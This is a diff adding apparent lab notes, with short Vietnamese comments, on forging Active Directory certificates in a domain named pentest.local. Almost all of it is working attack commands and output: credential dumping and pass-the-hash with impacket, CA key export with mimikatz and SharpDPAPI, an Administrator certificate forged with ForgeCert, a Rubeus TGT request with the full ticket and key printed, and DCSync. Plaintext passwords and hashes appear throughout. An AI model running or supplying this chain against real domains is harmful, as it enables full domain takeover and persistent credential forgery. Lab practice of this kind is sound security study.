@@ -1,0 +1,116 @@
+impacket-secretsdump pentest.local/Administrator:'admin@123!'@192.168.119.2
+impacket-psexec -hashes :789492fb036fdbf79a773d62ac043dce pentest.local/Administrator@192.168.119.2
+
+
+
+privilege::debug
+crypto::capi
+crypto::cng
+crypto::certificates /export
+crypto::certificates /systemstore:local_machine /store:my /export
+
+
+SharpDPAPI.exe certificates /machine
+-> Lấy thông tin gì?
+-> Tạo file cert.pem
+"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+-> Ở bước này nó sẽ bắt nhập passowrd, ở đây mình dùng password đơn giản là: 123
+
+-----------------------
+ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword 123 --Subject CN=User --SubjectAltName Administrator@pentest.local --NewCertPath administratorcert.pfx --NewCertPassword Password123
+-> Ở đây hoàn toàn có thể tạo với machine account
+(ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword 123 --Subject CN=User --SubjectAltName win10-domain$@pentest.local --NewCertPath win10-domain$.pfx --NewCertPassword Password123)
+C:\cert>ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword 123 --Subject CN=User --SubjectAltName Administrator@pentest.lab --NewCertPath administratorcert.pfx --NewCertPassword Password123
+CA Certificate Information:
+  Subject:        CN=pentest-DC2016-CA, DC=pentest, DC=local
+  Issuer:         CN=pentest-DC2016-CA, DC=pentest, DC=local
+  Start Date:     5/15/2026 8:06:58 AM
+  End Date:       5/15/2031 8:16:58 AM
+  Thumbprint:     B511D4B7FC9BA87704DDBE322C73A0C0D069CD2D
+  Serial:         1ADCD8B67B0C509B4FC565A36376726D
+
+Forged Certificate Information:
+  Subject:        CN=User
+  SubjectAltName: Administrator@pentest.lab
+  Issuer:         CN=pentest-DC2016-CA, DC=pentest, DC=local
+  Start Date:     5/15/2026 9:04:03 AM
+  End Date:       5/15/2027 9:04:03 AM
+  Thumbprint:     62C1B19CB311B805B4A2182A67509B22E3F2DE61
+  Serial:         0FD18E0D0B610916CDCA28439D9A9F66
+
+Done. Saved forged certificate to administratorcert.pfx with the password 'Password123'
+
+C:\cert>
+
+
+
+------------------------------------------
+Rubeus.exe asktgt /user:Administrator /certificate:administratorcert.pfx /password:Password123
+C:\cert>Rubeus.exe asktgt /user:Administrator /certificate:administratorcert.pfx /password:Password123
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGT
+
+[*] Got domain: pentest.local
+[*] Using PKINIT with etype rc4_hmac and subject: CN=User
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'pentest.local\Administrator'
+[*] Using domain controller: fe80::7417:b849:4746:6e96%3:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      dGd0Gw1wZW50ZXN0LmxvY2Fs
+
+  ServiceName              :  krbtgt/pentest.local
+  ServiceRealm             :  PENTEST.LOCAL
+  UserName                 :  Administrator (NT_PRINCIPAL)
+  UserRealm                :  PENTEST.LOCAL
+  StartTime                :  5/15/2026 9:15:26 AM
+  EndTime                  :  5/15/2026 7:15:26 PM
+  RenewTill                :  5/22/2026 9:15:26 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  90zgxHEQZSR2mg/TY1hbTQ==
+  ASREP (key)              :  A6C332E976482363BC865AB3D722C400
+
+
+C:\cert>
+
+
+
+lsadump::dcsync /user:Administrator
+
+192.168.119.2    dc2016.pentest.local dc2016
+export KRB5CCNAME=administrator.ccache
